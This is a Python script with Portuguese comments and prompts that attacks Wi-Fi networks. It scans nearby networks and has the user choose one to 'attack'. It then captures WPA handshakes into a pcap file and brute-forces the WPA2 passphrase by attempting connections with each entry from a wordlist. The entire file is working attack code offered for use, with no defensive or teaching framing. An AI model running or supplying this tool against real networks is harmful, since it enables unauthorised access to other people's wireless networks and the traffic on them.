import sys
import time
from scapy.all import *
from pywifi import PyWiFi, const, Profile
from concurrent.futures import ThreadPoolExecutor

# Define constantes
INTERFACE = 'wlan0mon'
MAX_ATTEMPTS = 20
MAX_WORKERS = 10

# Função para escanear redes Wi-Fi próximas
def scan_networks():
    wifi = PyWiFi()
    iface = wifi.interfaces()[0]
    iface.scan()
    time.sleep(5)
    scan_results = iface.scan_results()

    networks = []
    for network in scan_results:
        networks.append((network.ssid, network.bssid))

    return networks

# Função para capturar handshakes
def capture_handshake(ssid, bssid):
    print(f"[*] Iniciando captura de handshake para SSID: {ssid}, BSSID: {bssid}")
    def packet_handler(packet):
        if packet.haslayer(EAPOL):
            wrpcap('handshake.pcap', packet, append=True)
            print("[*] Handshake capturado e salvo em handshake.pcap")
            return True
        return False

    sniff(iface=INTERFACE, stop_filter=packet_handler, timeout=60)

# Função para realizar a tentativa de conexão com a senha
def wp_brutal(wifi, ssid, passkey):
    profile = Profile()
    profile.ssid = ssid
    profile.auth = const.AUTH_ALG_OPEN
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    profile.key = passkey

    wifi.remove_all_network_profiles()
    temp_profile = wifi.add_network_profile(profile)
    wifi.connect(temp_profile)

    # Espera a conexão
    time.sleep(5)

    if wifi.status() == const.IFACE_CONNECTED:
        print(f"[+] Senha encontrada: {passkey}")
        return True
    else:
        wifi.disconnect()
        return False

# Função para processar as redes e realizar os ataques
def process_network(ssid, password_list):
    wifi = PyWiFi().interfaces()[0]
    for password in password_list:
        if wp_brutal(wifi, ssid, password):
            break

# Função principal
def main():
    if len(sys.argv) < 2:
        print("Uso: python wifi.py <wordlist>")
        sys.exit(1)

    wordlist_file = sys.argv[1]

    try:
        with open(wordlist_file, 'r') as file:
            password_list = file.read().splitlines()
    except FileNotFoundError:
        print(f"Arquivo {wordlist_file} não encontrado.")
        sys.exit(1)

    print("[*] Escaneando redes Wi-Fi próximas...")
    networks = scan_networks()
    if not networks:
        print("[-] Nenhuma rede encontrada. Certifique-se de que a interface está em modo monitor.")
        sys.exit(1)

    for i, (ssid, bssid) in enumerate(networks):
        print(f"{i}) SSID: {ssid}, BSSID: {bssid}")

    try:
        choice = int(input("Selecione o número da rede que deseja atacar: "))
        target_ssid, target_bssid = networks[choice]
    except (ValueError, IndexError):
        print("Seleção inválida.")
        sys.exit(1)

    capture_handshake(target_ssid, target_bssid)

    print(f"[*] Iniciando ataque de força bruta contra SSID: {target_ssid}")
    process_network(target_ssid, password_list)
    print("[*] Ataque concluído.")

if __name__ == "__main__":
    main()
